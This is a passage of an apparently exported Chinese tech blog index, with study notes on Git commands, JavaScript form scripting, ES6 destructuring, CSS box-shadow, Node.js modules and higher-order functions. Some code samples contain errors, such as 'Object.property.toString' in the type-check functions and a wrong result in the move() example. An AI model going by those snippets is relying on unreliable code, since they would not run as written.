onload()： 用于替代 onreadystatechaneg 检测成功 responseText: 用于取得响应内容 send(): 用于发送请求 以上成员都包含在 createCORSRequest() 函数返回的对象中,在所有的浏览器中都能正常使用。 0x04 其它跨域技术未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Git]]></title>
      <url>%2F2016%2F12%2F20%2FGit%2F</url>
      <content type="text"><![CDATA[Git 本地仓库0x00 创建本地仓库 Repository版本库又名仓库，英文名 repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被 Git 管理起来，每个文件的修改、删除，Git 都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。 选择一个合适的地方，创建自己的本地仓库: 1234567891011121314151617181920212223D:\λ mkdir Git-RepositoryD:\λ cd .\Git-RepositoryD:\Git-Repositoryλ mkdir onejustoneBlog 目录: D:\Git-RepositoryMode LastWriteTime Length Name---- ------------- ------ ----d---- 2017/1/2 16:41 onejustoneBlogD:\Git-Repository\onejustoneBlogλ pwdPath----D:\Git-Repository\onejustoneBlog 如上，我们在 d: 盘下创建了一个 Git-Repository 目录，以作为未来所有 git 仓库的存放地，然后我们在该目录下创建了一个 onejustoneBlog 目录，这才是我们的真正的(第一个仓库)仓库所在地。 0x01 初始化本地仓库 git init 初始化本地仓库现在，我们通过 git init 命令把这个目录(onejustoneBlog)变成 Git 可以管理的仓库： 123456D:\Git-Repositoryλ cd .\onejustoneBlogD:\Git-Repository\onejustoneBlogλ git initInitialized empty Git repository in D:/Git-Repository/onejustoneBlog/.git/D:\Git-Repository\onejustoneBlogPS&gt; Git 仓库创建好了，当然现在还是一个空的仓库 (empty Git respository)，但是我们可以发现该目录下多了一个 .gti 目录,这个目录是 Git 来跟踪管理版本库的，没事千万别动它。 0x02 添加文件到本地仓库 git add 添加文件到暂存区我们在本地仓库 onejustoneBlog 中添加一个 readme.txt 文件，并写入如下内容: 12D:\Git-Repository\onejustoneBlogPS&gt;cat .\readme.txthello,world. 然后使用 git add 将工作目录下的文件添加到 暂存区: 1D:\Git-Repository\onejustoneBlogPS&gt;git add .\readme.txt 命令执行完成发现没有任何提示，这就对了，UNIX 的哲学即是“没有消息就是好消息”，说明添加成功。 git commit 提交文件到当前分支readme.txt 文件已经存在于 暂存区 了，如果没有问题的话就可以使用 git commit 进一步将其 提交 到当前 分支: 1234D:\Git-Repository\onejustoneBlogPS&gt;git commit -m &apos;add first line&apos; .\readme.txt[master (root-commit) c38922d] add first line 1 file changed, 2 insertions(+) create mode 100644 readme.txt git commit 命令，-m 后面输入的是本次提交的说明，可以输入任意内容 。 git commit 可以一次提交很多文件，所以我们多次 add 不同的文件,然后再一次性 commit。 每次修改，如果不add到暂存区，那就不会加入到commit中。 0x03 版本回归 git status 查看文件是否修改过git status 命令可以让我们时刻掌握仓库当前的状态。 12345678910111213D:\Git-Repository\onejustoneBlogPS&gt;vim .\readme.txtD:\Git-Repository\onejustoneBlogPS&gt;cat .\readme.txthello,world.today is new day.D:\Git-Repository\onejustoneBlogPS&gt;git status .\readme.txtOn branch masterChanges not staged for commit: (use &quot;git add &lt;file&gt;...&quot; to update what will be committed) (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory) modified: readme.txtno changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;) 如上，我们在 readme.txt 文件中添加了一行,当使用 git status 命令时告诉我们 readme.txt被修改过了，但还没有准备提交的修改。 git diff 查看具体的修改内容使用 git status 命令只能知道目标文件是否修改过，而使用 git diff 命令则可以告诉我们具体的修改内容: 12345678910D:\Git-Repository\onejustoneBlogPS&gt;git diff .\readme.txtdiff --git a/readme.txt b/readme.txtindex 00bb7fb..1060e74 100644--- a/readme.txt+++ b/readme.txt@@ -1,2 +1,2 @@-&lt;B4&gt;&lt;B2&gt;&lt;C7&gt;&lt;B0&gt;&lt;C3&gt;&lt;F7&gt;&lt;D4&gt;&lt;C2&gt;&lt;B9&gt;&lt;E2&gt;-+hello, world.+today is new day. 当我们确定了修改的内容的有效性以后就可以再次 git add ,git commit 提交修改了: 12345678910D:\Git-Repository\onejustoneBlogPS&gt;git add .\readme.txtD:\Git-Repository\onejustoneBlogPS&gt;git status .\readme.txtOn branch masterChanges to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) modified: readme.txtD:\Git-Repository\onejustoneBlogPS&gt;git commit -m &apos;add a new line&apos; .\readme.txt[master 1848f10] add a new line 1 file changed, 2 insertions(+), 2 deletions(-) git log 查看历史修改日志实际工作中，我们可能会对同一个文件进行多个修改，而当文件有特别大的时候单凭人类的记忆力是绝不能记住所有修改过的地方的,而这时就可以使用 git log 命令告诉我们历史记录: 123D:\Git-Repository\onejustoneBlogPS&gt;git log --pretty=oneline1848f10b57c339f8541c01d68604ff350514fffd add a new linec38922d79be946390febde044d83049ce32c71ac add first line 使用 --pretty=oneline 参数将会以最简化的形式显示历史记录。而前面的一大串数字是每个历史版本对象对应的 ID。 git rest 回退到指定版本在 Git 中，用 HEAD 表示当前版本，也就是最新的提交 1848f10b57c33... （注意我的提交ID和你的肯定不一样），上一个版本就是 HEAD^ ，上上一个版本就是 HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成 HEAD~100。 1234D:\Git-Repository\onejustoneBlogPS&gt;git log --pretty=oneline0ce366eb1d784479b66dc519019a144d8cfc26bc add third line1848f10b57c339f8541c01d68604ff350514fffd add a new linec38922d79be946390febde044d83049ce32c71ac add first line 我们可以看到，readme.txt 文件已经有了三个历史版本了,现在使用 git reset --hard HEAD^ 回到上一版本: 12D:\Git-Repository\onejustoneBlogPS&gt;git reset --hard HEAD^HEAD is now at 1848f10 add a new line 此时,再使用 git log 发现只存在两个历史版本了: 123456789101112D:\Git-Repository\onejustoneBlogPS&gt;git logcommit 1848f10b57c339f8541c01d68604ff350514fffdAuthor: onejustone &lt;807527097@qq.com&gt;Date: Mon Jan 2 19:43:03 2017 +0800 add a new linecommit c38922d79be946390febde044d83049ce32c71acAuthor: onejustone &lt;807527097@qq.com&gt;Date: Mon Jan 2 19:12:35 2017 +0800 add first line git rest –hard id如何又回到 rest 之前的那个版本,这时可以使用版本 ID 回到过去: 123456D:\Git-Repository\onejustoneBlogPS&gt;git reset --hard 0ce366eb1d7844HEAD is now at 0ce366e add third lineD:\Git-Repository\onejustoneBlogPS&gt;git log --pretty=oneline .\readme.txt0ce366eb1d784479b66dc519019a144d8cfc26bc add third line1848f10b57c339f8541c01d68604ff350514fffd add a new linec38922d79be946390febde044d83049ce32c71ac add first line git reflog但若是两天以后再想回到某个历史版本，而这时压根不记得 commit id 有怎么办? 使用 git reflog 查看命令历史，以便确定要回到哪个版本。 12345678D:\Git-Repository\onejustoneBlogPS&gt;git reflog0ce366e HEAD@&#123;0&#125;: reset: moving to 0ce366eb1d78441848f10 HEAD@&#123;1&#125;: reset: moving to HEAD^0ce366e HEAD@&#123;2&#125;: commit: add third line1848f10 HEAD@&#123;3&#125;: reset: moving to 1848c38922d HEAD@&#123;4&#125;: reset: moving to HEAD^1848f10 HEAD@&#123;5&#125;: commit: add a new linec38922d HEAD@&#123;6&#125;: commit (initial): add first line 使用 Git ，我们可以在过去和现在自由的穿梭。 0x04 工作区和暂存区 0x05 修改 git diff HEAD此外，使用 git diff HEAD -- readme.txt 命令可以查看工作区和版本库里面最新版本的区别. git checkout –filenamegit checkout -- readme.txt 意思就是，把 readme.txt 文件在工作区的修改全部撤销，这里有两种情况： 一种是 readme.txt 自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是 readme.txt 已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。 总之，就是让这个文件回到最近一次 git commit 或 git add 时的状态。 git checkout -- file 命令中的 -- 很重要，没有 --，就变成了“切换到另一个分支”的命令 git reset HEAD filegit reset HEAD fil 可以在还没有 commit 之前将暂存区的修改替换掉 (unstage) 并重新放回到工作区。 就是说 git reset 命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用 HEAD 时，表示最新的版本。 远程仓库 0x00 连接 Git假设你已经安装了 Git 并又有 Git 账号，那么只需进行如下配置: 12$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot; 注意 git config 命令的 --global 参数，用了这个参数，表示你这台机器上所有的 Git 仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。 此外，如果你觉得这种简单的连接方式不放心，你也可以使用 SSH 去连接 Git。 请参考: 0x01 添加远程仓库在开始远程同步之前，我们需要在 Github 中创建一个新的仓库，因为不论是将已存在的本地仓库同步到 Git，还是从 Git 克隆到本地，我们都需要这仓库已经存在于云端。 Ok，现在，假设已经在 Git 云端创建好了一个 Repository, 这个仓库的名字叫 SimpleAngularDemo 添加本地仓库到远程最初我们通过 git init 在本地初始化了一个仓库，就像下面一样: 12345678D:\Git-Repositoryλ mkdir SimpleAngularDemoD:\Git-Repositoryλ cd .\SimpleAngularDemoD:\Git-Repository\SimpleAngularDemoD:\Git-Repository\SimpleAngularDemoλ git initInitialized empty Git repository in D:/Git-Repository/SimpleAngularDemo/.git/ 那么，现在只需要通过如下命令就可以将这个本地的 SimpleAngularDemo 和 Git 云端的 SimpleAngularDemo 仓库关联在一起了: 12git remote add origin git@github.com:onejustone/SimpleAngularDemo.gitgit push -u origin master 从 Github 克隆最好的方式是先创建远程库，然后，从远程库克隆。 实用技巧如果关联错误了，那么可以使用如下命令取消并重新关联: 12git remote rm origin git remote add origin git@github.com:michaelliao/learngit.git 如果，第一次关联到一个 Git rmote，但是remote 中的目录不为空，那么需要向将 remote 中的文件 pull 但本地，才能推送，否则会产生如下错误: 123D:\Git-Repository\SimpleAngularDemoPS&gt;git push -u origin mastererror: src refspec master does not match any.error: failed to push some refs to &apos;git@github.com:onejustone/SportsStroe.git&apos; 解决这个问题的方式就是先 pull，再 push： 123D:\Git-Repository\SimpleAngularDemoPS&gt;git pull origin masterD:\Git-Repository\SimpleAngularDemoPS&gt;git push origin masterEverything up-to-date]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(2)表单脚本]]></title>
      <url>%2F2016%2F12%2F19%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(2)%E8%A1%A8%E5%8D%95%E8%84%9A%E6%9C%AC%2F</url>
      <content type="text"><![CDATA[0x00 表单基础在 HTML 中，表单由 &lt;form&gt; 元素来表示，但是在 JavaScript 中，表单对应的是 HTMLFormElement 类型，它具有的一些独有的属性和方法。 action: 接收请求的 URL elements: form 中所有控件的集合 length: form 中控件的数量 method: 要发送的 HTTP 请求类型 name: 表单的名称 reset(): 重置 form 域为默认值 submit(): 提交 form target: 用于发送请求和接收响应的窗口的名称 acceptCharset: 服务器能够处理的字符集 enctype: 请求的编码类型。 查找表单123456// 通过 ID 查找var form = document.querySelector(&quot;#form1&quot;);// 通过 document.forms 集合查找var firstForm = document.forms[0] // 索引查找var myForm = document.forms[&quot;form2&quot;] // 取得 name 为 form2 的表单 提交表单12345678// 通用提交表单&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;// 自定义提交表单&lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;// 图像按钮&lt;input type=&quot;image&quot; src=&quot;pho.gif&quot;&gt; 阻止表单提交的默认行为12345678910111213141516171819var form = document.querySelector(&quot;#myForm&quot;)EventUtil.addHandler(form, &quot;submit&quot;, function(event)&#123; // 取得事件对象 event = EventUtil.getEvent(event) var target = EventUntil.getTarget(event) // 阻止默认事件 EventUtil.preventDefault(event); // 取得提交按钮 var btn = target.elements[&quot;submit-btn&quot;] // 验证表单 // do something // 禁用提交按钮 btn.disabled = true&#125;) 为避免用户重复提交，应该在第一次提交表单以后就禁用提交按钮，或者利用 onsubmit 事件处理程序取消后续的表单提交操作 如上，要在第一次点击后就禁止提交，只需要监听 submit 事件，并在该事件发生时禁用提交表单按钮即可。 表单字段通过 form 的 elements 属性可以获得所有表单字段，然后可以安装索引或者 name 特性来访问它们。 如果多个表单控件都使用一个 name ，那么会放回一改 name 命名的一个 NodeList 集合 共有的表单字段属性共有的表单字段属性: disabled: 布尔值，表示当前字段是否被禁用 form: 指向所属的 form name: 当前字段的名称 type: 当前字段的类型 除了 &lt;fieldset&gt; 之外，所有的表单都有 type 属性，对于 &lt;input&gt; 元素，该值等于 HTML 的 type 值。 对于&lt;selete&gt;元素该值如下: 单选列表：type 属性值 select-one 多选列表：type 属性值 select-multiple 共有的方法和事件每个表单字段都有两个方法:focus() 和 blur() 方法。 此外，所有表单字段都支持下列 3 个事件: blur: 字段失去焦点时 触发 focus: 字段获得焦点时触发 change: 对于&lt;input&gt; 和 &lt;textarea&gt; 元素，在它们失去焦点且 value 值改变时触发；对于 &lt;select&gt; 元素，在其选项改变时触发。 0x01 文本框脚本有两种方式表现文本框:&lt;input&gt; 的单行文本框和 &lt;texarea&gt; 的多行文本框。 1&lt;input type=&quot;text&quot; size=&quot;25&quot; maxlenth=&quot;50&quot; value=&quot;how are you?&quot;&gt; 对于单行文本框，通过 size 特性可以指定文本框能够显示的字符数，通过 value 特性访问其内容，而maxlength则用于指定其可以接受的最大字符数。 相对于 &lt;textarea&gt; 要指定文本框的大小可以使用 rows 和 cols 特性。 1&lt;textarea rows=&quot;24&quot; cols=&quot;5&quot;&gt;who are you?&lt;/textarea&gt; 选择文本&lt;input type=&quot;text&quot;&gt; 和 &lt;textarea&gt; 都支持 select() 方法用于选中所有文本，而与此对应的是 select 事件。 select事件在选中文本的时候就会触发 1234var textbox = form.elements[&apos;textbox&apos;]textbox.onselect = function()&#123; alert(textbox.value)&#125; 但是通过 select 事件只能确定用户何时选择了文本，却不知道用户到底选择了哪些文本，基于此 HTML5 添加了 selectionStart 和 selectionEnd 方法。 要取得用户在文本框中选取的文本，可以使用如下方法: 123textbox.onselect = function()&#123; alert(textbox.value.substring(textbox.selectionStart, textbox.selectionEnd))&#125; HTML5 约束验证 APIrequired 必填在字段任何标注有 required 的字段，在提交表单时都不能空着。 1&lt;input text=&quot;text&quot; name=&quot;username&quot; required&gt; 该属性适用于 &lt;input&gt;,&lt;textarea&gt;,&lt;select&gt; 字段。 plachholer 提示符 0x02 选择框脚本选择框通过 &lt;select&gt; 元素和 &lt;option&gt; 元素创建，它们同属于 HTMLSelectElement 类型，为了方便交互，该类型提供了如下属性: add(newOption, relOption): 插入新的 &lt;option&gt; 元素，在相关项之前 multiple: 布尔值，是否允许多项选择 options: 所有的 &lt;option&gt; 元素集合 remove(index): 移除给定位置的索引项 选择框 &lt;select&gt; 的 type 属性值不是 select-one 即是 select-muitiple 为了便于访问数据，每个 &lt;option&gt; 元素都有一个 HTMLOptionElement 对象，该对象具有如下属性: index: 当前选择项在 options 集合中的索引 selected: 布尔值，表示当前选项是否被选中 select: 选项的文本 value: 选项的值 &lt;select&gt; 元素的值，就是选中的 &lt;option&gt; 元素的 value 特性值。如果没有 value 特性，则是 &lt;option&gt; 元素的文本值 选择项对于只能选择一项的选择框，最简单的方式就是使用 selectedIndex 属性: 1var selectedOption = selectbox.options[selectbox.selectedIndex] 而对于可以选择多项的选择框，我们需要循环遍历选择集合，然后测试每个选择项的 seleted 属性 1234567891011121314151617function getSelectedOption(selectBox)&#123; var result = new Array() var option = null for(let i=0,len = selectBox.options.length;i &lt; len;i++)&#123; option = selectBox.options[i] if(option.selected)&#123; result.push(option) &#125; &#125; return result&#125;var selectBox = document.querySelector(&quot;#selectBox&quot;)var selectedOptions = getSelectedOption(selectBox)// 获得所有被选中的项 0x03 表单序列化在表单对服务器发送数据之前，需要将表单中的有效数据进行格式化的编码，即表单序列化。 下面的 serialize 函数可以实现表单的序列化操作: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function serialize(form)&#123; let parts = [],field = null, i, len, j, optLen, option, optValue; for(i =0, len = form.elements.length; i&lt;len;i++)&#123; field = form[i] switch(field.type)&#123; case &quot;select-one&quot;: case &quot;select-multiple&quot;: if(field.name.length)&#123; for(j=0,optLen = field.options.length;j &lt; optLen;j++)&#123; option = field.options[j] if (option.selected)&#123; optValue = &quot;&quot; if (option.hasAttribute)&#123; optValue = option.hasAttribute(&quot;value&quot;)? option.value : option.text &#125; else &#123; optValue = option.attributes[&quot;value&quot;].specified ? option.value : option.text &#125; parts.push(encodeURIComponent(field.name) + &quot;=&quot; +encodeURIComponent(optValue)) &#125; &#125; &#125; break; case undefined: //字段集 case &quot;file&quot;: //文件输入 case &quot;submit&quot;: //提交按钮 case &quot;reset&quot;: //重置选项 case &quot;button&quot;: //自定义按钮 break; case &quot;radio&quot;: //单选按钮 case &quot;checkbox&quot;: //复选按钮 if (!field.checked)&#123; break; &#125; // 执行默认操作 default: // 不包含没有名字的字段 if (field.name.length)&#123; parts.push(encodeURIComponent(field.name) + &quot;=&quot; + encodeURIComponent(field.value)) &#125; &#125; &#125; // 对表单字段的名称和值进行 URL 编码，各字段之间使用 &quot;&amp;&quot; 分隔 return parts.join(&quot;&amp;&quot;)&#125; 在整个表单序列化的过程中，稍微复杂一点的就是 &lt;select&gt; 元素了，它能是单选框或者多选框，那么我们需要去遍历控件中的每一项。当不存在 value 特性时，使用 text 的值，我们使用了 hasAttribute() ，而在 IE 中需要使用 specified 特性。 对于单选按钮和复选按钮，需要检查其 checked 属性书否为 false,是则退出 switch 循环。若为 true 则将其键值对进行编码，推到 parts数组。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(3)解构赋值]]></title>
      <url>%2F2016%2F12%2F19%2FES6(3)%E6%95%B0%E7%BB%84%E7%9A%84%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC%2F</url>
      <content type="text"><![CDATA[0x00 数组的结构赋值ES6允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。 在 ES6 中可以这样给变量声明赋值 1var [a, b, c] = [1, 2, 3] 解构的本质实际上是 模式匹配 ,只要等号两边的模式相同，等号左边就会被赋予对应的值。 1234let [foo, [[bar], baz]] = [1, [[2], 3]];foo // 1bar // 2baz // 3 如果解构不成功，变量的值就等于undefined。 注意，当等号的右边不是数组时，结构将会报错 1234567// 报错let [foo] = 1;let [foo] = false;let [foo] = NaN;let [foo] = undefined;let [foo] = null;let [foo] = &#123;&#125;; 0x01 默认值可以在结构的的同时制定默认值 12[x, y = &apos;b&apos;] = [&apos;a&apos;, undefined];// x = &apos;a&apos;,y = &apos;b&apos; ES6 内部严格使用全等运算符(===)来判断一个位置是否有值。所以，若一个数组元素不严格等于 undefined，默认不会生效。 12var [x = 1] = [null];// x = null 默认值可以引用解构赋值的其他变量，但该变量必须已经声明。 123let [x = 1, y = x] = [1] // x= 1; y = 1let [x = 1, y = x] = [1, 2] // x = 1; y = 2let [x = y, y = 1] = [ ] // ReferenceError 如上，x 用到默认值 y 时，y 还没有声明，因此报错。 0x02 对象解构赋值不同于数组元素是按次序排列的，对象的属性没有次序，所以变量必须与属性同名，才能取得正确的值。 1var &#123;bar, foo&#125; = &#123;foo:&quot;aa&quot;, bar:&quot;bb&quot;&#125; 其实，对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量。 12var &#123;foo:foo, bar:bar&#125; = &#123;foo:&quot;aa&quot;, bar:&quot;bb&quot;&#125;// 真正被赋值的是后者，而不是前者。 我们称前者是匹配的模式，后者才是变量。而真正被赋值的是变量，而不是模式。 注意如下格式: 12let foo;(&#123;foo&#125; = &#123;foo:1&#125;) let 命令下面一行的圆括号是必须的，否则会报错。因为解析器会将起首的大括号，理解成一个代码块，而不是赋值语句。 对象的循环结构 123456789101112var obj = &#123; p:[ &apos;hello&apos;, &#123; y:&apos;world&apos;, &#125; ]&#125;var &#123;p:[x,&#123;y&#125;]&#125; = obj;//x hello//y world 注意，这时p是模式，不是变量，因此不会被赋值。 0x03 字符串解构赋值对字符串进行结构时，字符串将会被转换为一个类似数组的对象。 1234const [a,b, c] = &apos;who&apos;a // &apos;w&apos;b // &apos;h&apos;c // &apos;o&apos; 0x04 数组和布尔值解构解构赋值的规则是，只要等号右边的值不是对象，就先将其转为对象。但是 undefined 和 null 无法转为对象，因此对它们进行解构赋值将会报错。 12345let &#123;toString: s&#125; = 123;s === Number.prototype.toString // truelet &#123;toString: s&#125; = true;s === Boolean.prototype.toString // true 0x05 函数参数解构函数参数也可以解构: 12[[1, 2], [3, 4]].map(([a, b]) =&gt; a + b);// [3, 7] 解构的同时指定默认值: 1234567function move(&#123;x = 0, y = 0&#125; = &#123;&#125;)&#123;// 对参数解构的同时指定默认值 return [x, y];&#125;move() // [0,0]move(&#123;x:3, y:4&#125; // [3, 8] 0x06 解构的用途 交换变量的值1[x, y] = [y, x] 获取函数返回的多个值当函数有多返回值，并且放在数组或者对象中，那么使用解构获取这些类型的返回值真是再好不过了。 12345678function example () &#123; return &#123; foo:1, bar:2 &#125;&#125;var &#123;foo, bar&#125; = example() 函数参数识别解构赋值可将一组参数与变量名对应起来: 123// 参数数无序的值function f(&#123;x, y, z&#125;) &#123;...&#125;f(&#123;z:3, x:4, y:1&#125;) 提取 JSON 数据12345678var jsonData = &#123; &apos;id&apos;:42, &apos;status&apos;:&apos;ok&apos;, &apos;data&apos;: [3434,444]&#125;let &#123;id, status, data&#125; = jsonDataconsole.log(id, status, data)// 42 &apos;ok&apos; [ 3434, 444 ] 函数参数默认值1234567891011jQuery.ajax = function (ur, &#123; async = true, beforeSend = function () &#123;&#125;, cache = true, complete = function () &#123;&#125;, crossDomain = false, global = true, // more config&#125;)&#123; // do something&#125; 变量 MAP但凡具有 Iterator 接口的对象都可以使用 for...of 循环遍历,比如 MAP 对象，然后在通过解构赋值，可以很方便的获得键名和键值。 123456789101112131415var map = new Map()map.set(&apos;name&apos;, &apos;Jack&apos;)map.set(&apos;home&apos;, &apos;china&apos;)for(let [key, value] of map)&#123; console.log(key+&apos;: &apos;+value)&#125;for(let [key] of map)&#123; // 单独获得键名&#125;for(let [, vlaue] of map)&#123; // 单独获得键值&#125; 加载模块的指定方法1cosnt &#123;SourceMapConsumer, SourceNode&#125; = require(&apos;source-map&apos;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS视觉效果]]></title>
      <url>%2F2016%2F12%2F17%2F%E8%A7%86%E8%A7%89%E6%95%88%E6%9E%9C%2F</url>
      <content type="text"><![CDATA[0x00 投影的绘画机制当为一个元素添加 box-shadow 时，我们便会从视觉上得到一个投影的效果。 比如: 123456#box&#123; width: 100px; height: 100px; background: deeppink; box-shadow: 5px 6px 4px rgba(0,0,0,0.5);&#125; 我们对 div#box 添加了 box-shadow 属性，并指定了三个长度值和一个颜色值。对于这样的用法，我们再熟悉不过了。要得到上图的效果，浏览器渲染引擎其实进行了四步： 以该元素相同的位置和尺寸，画一个 rgba(0,0,0,0.5) 的矩形。 把它向右偏移 5px，向下偏移 6px。 使用高斯模糊算法对其进行 4px 的模糊处理。 模糊后的矩形与原始元素的交集部分会被裁切掉。 所以，从投影绘制的机制来看，绘制的投影其实是在元素的上层的。 单侧投影box-shadow 鲜为人知的第四个参数，称为 扩张半径。这个参数会根据指定的值去扩大(当指定负值时)或缩小投影的尺寸。比如，一个 -5px 的扩张半径会把投影的宽度和高度各减少 10px （即每边各 5px）。 那么，当应用一个负的扩张半径，而它的值刚好等于模糊半径，那么投影的尺寸就会与投影所属元素的尺寸一致，如果不使用偏移参数来移动它，将看不见任何投影。 这正是我们想要的。 1box-shadow: 0px 5px 4px -4px black; 我们给了投影一个正的垂直偏移量，而在另外三侧是没有投影的。 双侧投影目前为止，还无法指定投影在水平方向上放大，而在垂直方向上缩小，要实现双侧投影的效果唯一的办法就是使用两块投影来达到目的。 12box-shadow: 6px 0px 5px -4px yellow, -6px 0px 5px -4px green; 未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入浅出Node.js(1)模块机制]]></title>
      <url>%2F2016%2F12%2F15%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode-js(1)%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6%2F</url>
      <content type="text"><![CDATA[0x00 CommonJS CommonJS 规范为 JavaScript 制定了一个美好的愿景，使 JavaScript 可以运行在任何地方。 目前 CommonJS 规范涵盖了模块，二进制，Buffer，字符集编码，I/O流，进程环境，文件系统，套接字，单元测试，Web 服务器网关接口，包管理等。 Node 与浏览器和 W3C 组织，CommJS 组织，ECMASript 共同构成了一个繁荣的 JavaScript 生态系统。 CommonJS 模块规范CommonJS 对模块的定义分为模块定义，模块标识，模块引入。 在模块中存在一个 module 对象，它代表模块自身，而上下文中的 exports 对象属于 module 对象的一个属性，用于导出当前对象的变量或方法。 在 Node 中，一个文件就是一个模块，将方法挂载在 exports 对象上作为属性即可定义导出的方式: 12//math.jsexports.add = function (a, b) &#123; return a + b;&#125; 在另一个文件中，通过 require() 方法引入模块后，就能调用定义的属性和方法了: 1234// program.jsvar math = require(&apos;math&apos;);exports.increment = function (val1, val2) &#123; return math.add(val1, val2);&#125; 而模块标识其实就是传递给 require() 方法的参数。 模块的意义在于将类聚的方法和变量等限定在私有的作用域中，同时支持引入和导出功能以顺畅的连接上下游依赖。 0x01 Node 的模块实现在 Node 中，模块分为两类:一类是 Node 提供的模块，称为核心模块；另一类是用户编写的模块，称为文件模块。 一旦在 Node 中引入模块以后便会经历随后三个步骤: 路径分析 ==&gt; 文件定位 ==&gt; 编译执行。 但是，Node 核心模块 源代码在编译过程中，直接被编译进了二进制执行文件。当 Node 进程启动时，部分核心源代码便直接被载入内存，连文件定位和编译执行都不需要。所以其加载速度是最快的。 而 文件模块 则是在运行时动态加载，需要完整的路径分析，文件定位，编译执行过程，速度比核心模块慢。 0x01 包与NPM包实际上是一个存档文件，即一个目录打包为 .zip 或 .tar.gz 格式的文件，安装以后解压还原为目录。 完全符合 CommonJS 规范的包的目录结构应该包含如下内容: package.json: 包描述文件 bin: 可执行二进制文件目录 lib: 存放 Javascript 代码的目录 doc: 存放文档的目录 test: 存放单元测试用例的代码 package.json下面是 Node 中 package.json 文件中的主要字段； name: 包名 description: 包简介 version: 版本号 author: 作者 bin: 提供命令行使用 main: 模块引入方法 requier() 在包引入时优先检查该字段，并将其作为包中其余模块的入口 keywords: 关键词数组，使得 NPM 可以快速搜索到该包 maintainers: 包维护着列表。 contributors: 包贡献者列表 bugs: 反馈 bug 的网页地址或邮箱 licenses: 当前包所使用的许可证列表 repositories: 托管源代码的位置列表 dependencies: 使用当前包所需要依赖的包列表，而 NPM会通过这个属性自动加载依赖的包 devDependecies: 一些模块只在开发时需要依赖。 NPM 常用功能CommonJS 包规范是理论，NPM 是其中的一种实践。 对于 Node 而言， NPM 帮助完成了第三方模块的发布，安装和依赖。借助 NPM, 用户可以快速安装和管理依赖包。 下面是 node 的常用方法: 查看帮助运行 npm -v 可查看当前 NPM 版本。而直接运行 npm 则可以查看 NPM 帮助信息。 安装依赖 执行 npm install packe_name 便可以安装一个包，并将其自动解压到 node_modules 目录下。 执行 npm init 会在当前目录下新建一个 package.json 文件 执行 npm install pack_name --save 将会安装一个包，并将其添加到 package.json 中 dependencies 字段中作为项目中的依赖。 执行 npm install pack_name -g 代表进行全局模式安装。但是全局模式并不意味着可以在计算的任何地方通过 require() 来引用它。 -g 实际上是将一个包安装为全局可用的可执行命令。它根据包描述文件中的 bin 字段配置。将实际脚本链接到与 Node 可执行文件相同的路劲下。 0x02 小结CommonJS 提出的规范很简单，但却帮助 Node 形成了它的骨骼。 Node 通过模块规范组织了自身的原生模块，弥补了 Javascript 弱结构性的问题，形成了稳定的结构，并向外提供服务。 NPM 通过对包规范的支持，有效的组织了第三方模块，使得项目开发中的依赖问题得到了很好的解决，并有效提供了分享和传播的平台。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS高阶(4)高级函数]]></title>
      <url>%2F2016%2F12%2F13%2FJS%E9%AB%98%E9%98%B6(4)%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%2F</url>
      <content type="text"><![CDATA[0x00 高级阶数高阶函数 (一个函数的参数是函数，或是将函数作为返回值的函数) 在 Javascript 中随处可见(比如数组中的 forEach(),sort()，map()……)，比起普通函数，高阶函数要灵活太多。除了传统意义上的函数调用返回，还形成了一种后续传递的风格(Continuation Passing Style) 的结果接收方式。 0x01 函数柯里化与偏函数应用 类型检测我们先试着回忆片刻，我们知道，在 javascript 中对基本类型值的类型判断要用 typeof 操作符，对引用类型的判断要用 instanceof 操作符。其实，Javascript 内置的类型检测机制并不完全可靠，比如 typeof 操作符在应对正则表达式的时候就会返回 function，因此很难确定某个值到底是不是函数。而 instanceof 操作符，存在多个全局作用域(比如，一个页面中有多个框架)的问题。此外，由于 JSON 的存在，在检测某个对到底是原生对象还是开发人员自定义的对象时也有问题。 针对上述问题，都有一终极解决办法，就是 在任何值上调用 Object 原生的 toString() 方法，该方法会返回一个 [object NativeConstructorName] 格式的字符串。而每个类在内部都有一个 [[Class]] 属性，它指向上述字符串中的构造函数名。 利用这一点，可以创建以下函数: 1234567891011121314// 检测数组类型function isArray(value)&#123; return Object.property.toString(value) == &quot;[ object Array]&quot;;&#125;// 检测检测是否是原生函数function isFunction(value)&#123; return Object.property.toString(value) == &quot;[ object Function]&quot;;&#125;// 检测正则表达式function isRegExp(value)&#123; return Object.property.toString(value) == &quot;[object RegExp]&quot;;&#125; 其实，还有很多类型检测，照这么写下去，代码冗余太多，所以，我们可以引入一个新的函数，而这个新的函数可以像工厂一样批量创建一些类似的函数: 123456var isType = function(type)&#123; var toString = Object.prototype.toString; return function(obj)&#123; return toString.call(obj) == &apos;[object&apos; + &apos; &apos;+type + &apos;]&apos;; &#125;;&#125;; 如上，通过 isType() 函数，预先指定了参数 type 的， 